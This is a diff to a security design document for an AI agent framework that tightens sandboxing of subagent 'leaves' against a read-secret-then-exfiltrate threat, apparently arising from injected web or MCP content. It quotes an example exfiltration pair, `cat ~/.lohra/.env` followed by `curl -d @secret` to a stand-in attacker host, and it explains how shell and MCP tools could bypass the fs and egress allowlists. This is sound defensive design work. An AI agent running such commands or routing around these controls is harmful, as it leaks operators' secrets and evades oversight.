@@ -389,7 +389,8 @@ This read-secret-then-exfiltrate channel is wide open in stock isolation and is 
 
 - **(1) fs path-allowlist for leaves** — deny reads of `~/.lohra/`, profile dirs, `.env`, key/secret files, and anything outside the run's working scope.
 - **(2) egress allowlist for leaf `web_fetch`** — default-deny / allowlist for unattended runs, on top of SSRF private-range blocking, so a leaf cannot reach an arbitrary public host.
-- **(3) taint propagation** — when the authoring (parent) context touched `web_fetch`/MCP output, the run is **tainted** and its leaves drop to **reduced capability** (no fs read + no web egress at all).
+- **(3) taint propagation** — when the authoring (parent) context touched `web_fetch`/MCP output, the run is **tainted** and its leaves drop to **reduced capability** (no fs read, no web egress, no shell and no MCP at all).
+- **(4) shell + MCP deny-by-default (issue #4)** — the alternative capabilities that made (1) and (2) bypassable: `terminal` (guarded only by a self-declared "speed-bump" denylist) and `mcp_*` (an operator-configured egress the allowlists never saw). Both off unless the operator opts in; never openable from the spec.
 
 **Two subtleties that would re-open the hole if missed:**
 
@@ -402,7 +403,8 @@ This read-secret-then-exfiltrate channel is wide open in stock isolation and is 
 
 1. **fs path-allowlist** — for `fs` reads/writes, resolve the target to a real absolute path and require it to be **inside `working_root`** (the run's working scope, defined concretely as `~/.lohra/runs/<run_id>/work` plus any explicit operator-allowed roots in `policy.fs_allow`). Deny `~/.lohra/` config/profile/key paths, `.env`, dotfile secrets, and anything outside the allow-set. Symlink-resolved (`realpath`) so a symlink can't escape. Tainted run → deny **all** fs reads.
 2. **egress allowlist** — for `web_fetch`, after `validate_public_url` passes (SSRF), additionally require the host to match `policy.egress_allow` (default-deny if unset for unattended runs). Manual redirects re-checked against the allowlist on every hop (reusing the existing per-hop revalidation in `web/fetch.py`). Tainted run → deny **all** web egress.
-3. **auto-deny + exclusions** — unchanged from `subagent_dispatch` (dangerous shell auto-deny, `_CHILD_EXCLUDED_TOOLS`).
+3. **shell + MCP containment (issue #4)** — `terminal` and every `mcp_*` tool are **denied by default**. This used to read "unchanged from `subagent_dispatch` (dangerous shell auto-deny, `_CHILD_EXCLUDED_TOOLS`)", which was **wrong**: neither list covers `terminal` or `mcp_*`, so a leaf could run `cat ~/.lohra/.env` / `curl -d @secret https://attacker.test` and route around controls (1) and (2) entirely. Opt-in is the **operator's** — `"allow_terminal": true` and `"mcp_allow": ["<server>"]` in `workflow_policy.json`, or `LOHRA_LEAF_ALLOW_TERMINAL=1` / `LOHRA_LEAF_MCP_ALLOW=srv1,srv2` — and **never** a spec field: a leaf that may run a shell has transitively every capability the other controls deny. `mcp_allow` matches the **whole** server segment (`mcp_{server}_`), slugged like `mcp_tool_name` slugs it, so `git` cannot silently cover `github`. Tainted run → denied regardless of the opt-in. Gated on **both surfaces** (`sandbox_tool_definitions`): what the dispatch would refuse by name is also stripped from the leaf's tool definitions, so a leaf never burns an iteration off its 50-cap calling a tool it can only be refused — the same strip-and-refuse shape `delegate.py` uses for `_CHILD_EXCLUDED_TOOLS`. `_CHILD_EXCLUDED_TOOLS` and the dangerous-shell auto-deny still run **underneath** this wrapper.
+4. **auto-deny + exclusions** — unchanged from `subagent_dispatch` (dangerous shell auto-deny, `_CHILD_EXCLUDED_TOOLS`). A tool name outside the four gated classes (fs, egress, `terminal`, `mcp_*`) passes through to them — the containment is per capability class, deliberately, so an ordinary stateless tool added to the registry later is not silently broken.
 
 The `workflow`-node depth-aware factory (§4.4) adds only the orchestration triad and **inherits this same sandbox** for every leaf beneath it — it never re-expands fs/egress capability.
 
@@ -414,7 +416,7 @@ Bounded **by construction** via the unified budget (§7): `effective_width ≤ m
 
 ### 8.5 Honest residual after mitigation
 
-`detect_dangerous_command` remains a bypassable denylist heuristic (auto-deny ≠ a true kernel sandbox), and even a sandboxed leaf within `working_root` with an allowlisted egress host is capability that fan-out amplifies. The exfil channel is **mitigated, bounded, and logged** by actual controls (§8.2–8.3), not merely documented — but the leaf is contained, not hermetically jailed. We do not claim otherwise.
+`detect_dangerous_command` remains a bypassable denylist heuristic (auto-deny ≠ a true kernel sandbox) — it is now load-bearing **only** for an operator who explicitly set `allow_terminal`, since leaves otherwise get no shell at all (issue #4); an operator who turns the shell on is trusting the specs they run, and that is the whole guard left. Even a sandboxed leaf within `working_root` with an allowlisted egress host is capability that fan-out amplifies. The exfil channel is **mitigated, bounded, and logged** by actual controls (§8.2–8.3), not merely documented — but the leaf is contained, not hermetically jailed. We do not claim otherwise.
 
 ### 8.6 Explicitly rejected substrates
 
